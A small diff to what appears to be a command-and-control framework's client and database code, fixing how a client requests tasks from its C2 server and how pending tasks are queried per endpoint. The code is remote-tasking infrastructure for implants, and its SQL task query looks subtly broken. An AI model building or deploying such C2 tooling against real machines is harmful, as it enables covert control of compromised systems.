@@ -126,7 +126,7 @@ class C2Client:
         response_decoded = json.loads(received_data.decode())
         logger.debug(f"Closing connection to {self.dest_ip}:{self.dest_port}")
         return response_decoded
-        
+
     
     def register_endpoint(self):
         # reach out to C2 server and get an endpoint UUID
@@ -146,6 +146,7 @@ class C2Client:
         request = {}
         request["type"] = "client"
         request["action"] = "get_tasks"
+        request["endpoint_id"] = self.endpoint_id
         new_tasks = self.c2_server_transaction(server_message=request)
         self.tasking_queue.extend([[row.split()[0],row.split()[1]] for row in new_tasks])
 
@@ -222,7 +223,8 @@ class C2Database:
             data = (filter["id"])
         elif filter.get("new_tasks", False):
             query = '''SELECT uuid, task FROM tasking WHERE endpoint = ? and results = NULL'''
-            data = (endpoint)
+            data = (str(endpoint))
+            logger.debug(str(endpoint))
         else:
             query = '''SELECT * FROM tasking WHERE endpoint = ?'''
             data = (str(endpoint))
